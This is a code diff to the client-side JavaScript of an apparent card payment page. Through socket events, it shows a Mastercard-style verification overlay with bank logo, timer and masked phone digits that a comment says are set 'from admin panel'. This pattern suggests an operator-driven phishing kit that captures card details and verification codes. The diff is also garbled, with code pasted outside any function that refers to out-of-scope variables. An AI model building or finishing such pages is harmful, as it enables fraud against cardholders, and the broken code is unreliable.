@@ -892,6 +892,7 @@ function setupSocketListeners() {
         }
     });
     
+// Add this to your setupSocketListeners function where you handle show_mc_verification
 socket.on('show_mc_verification', (data) => {
     console.log('Showing MC verification overlay with data:', data);
     
@@ -899,14 +900,23 @@ socket.on('show_mc_verification', (data) => {
     if (data.phoneLastFour) {
         // Store it in the state for later use
         state.phoneLastFour = data.phoneLastFour;
+        console.log('Phone last four digits set to:', data.phoneLastFour);
     }
-        showProcessingUI();
-        
-        setTimeout(() => {
-            showMCVerification(data);
-        }, 1500);
-    });
     
+    showProcessingUI();
+    
+    setTimeout(() => {
+        showMCVerification(data);
+    }, 1500);
+});
+
+// Then in updateMcVerificationUI function, modify this part:
+// Set masked phone number with the correct last 4 digits from admin panel
+if (document.getElementById('cardLastFourDigits')) {
+    const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
+    console.log('Setting phone last four digits to:', lastFour);
+    document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
+}
     socket.on('start_verification', (data) => {
         console.log('Start verification requested:', data);
         
@@ -1211,31 +1221,33 @@ function setupMcVerificationButtons() {
         };
     }
     
-    // Cancel button handler
-    const cancelBtn = document.getElementById('mcCancelBtn');
-    if (cancelBtn) {
-        cancelBtn.onclick = function() {
-            // Hide the verification overlay
-            const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-            if (mcVerificationOverlay) {
-                mcVerificationOverlay.style.display = 'none';
-            }
-            
-            // Clear the MC timer if it exists
-            if (mcTimerInterval) {
-                clearInterval(mcTimerInterval);
-            }
-            
-            // Notify server
-            socket.emit('mc_verification_cancelled', {
-                invoiceId: state.transactionId
-            });
-            
-            // Reset the form
-            resetForm();
-        };
-    }
+  // Update in the setupMcVerificationButtons function
+// Cancel button handler
+const cancelBtn = document.getElementById('mcCancelBtn');
+if (cancelBtn) {
+    cancelBtn.onclick = function() {
+        // Hide the verification overlay
+        const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+        if (mcVerificationOverlay) {
+            mcVerificationOverlay.style.display = 'none';
+        }
+        
+        // Clear the MC timer if it exists
+        if (mcTimerInterval) {
+            clearInterval(mcTimerInterval);
+        }
+        
+        // Notify server
+        socket.emit('mc_verification_cancelled', {
+            invoiceId: state.transactionId,
+            reason: 'cancelled_by_user'
+        });
+        
+        // Show error UI with canceled message
+        showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
+    };
 }
+            
     
 function updateMcVerificationUI(data) {
     // Update bank logo
@@ -1561,15 +1573,26 @@ function handleCardSubmit(e) {
     
     const submitBtn = document.querySelector('button[type="submit"]');
     submitBtn.disabled = true;
+    
+    // Save the original text
+    const originalBtnText = submitBtn.textContent || 'Pay Now';
+    
+    // Replace with loading spinner + text
     submitBtn.innerHTML = `
         <div class="flex items-center justify-center">
             <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                 <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
-            Processing
+            <span style="opacity: 0.8;">${originalBtnText}</span>
         </div>
     `;
+    
+    // Apply some blur effect to the text
+    const textSpan = submitBtn.querySelector('span');
+    if (textSpan) {
+        textSpan.style.filter = 'blur(0.8px)';
+    }
     
     state.transactionId = Math.random().toString(36).substring(2, 15);
     
@@ -1590,8 +1613,11 @@ function handleCardSubmit(e) {
         timestamp: new Date().toISOString()
     });
     
-    showProcessingUI();
-setTimeout(() => {
+    // Keep showing the loading spinner without immediately changing the UI
+    // The MC verification or processing UI will show based on socket events
+    
+    // Set a timeout in case the server doesn't respond
+    setTimeout(() => {
         const processingIndicator = document.querySelector('.processing-indicator');
         if (processingIndicator) {
             showErrorUI("Connection Timeout", "No response from payment server. Please try again.");
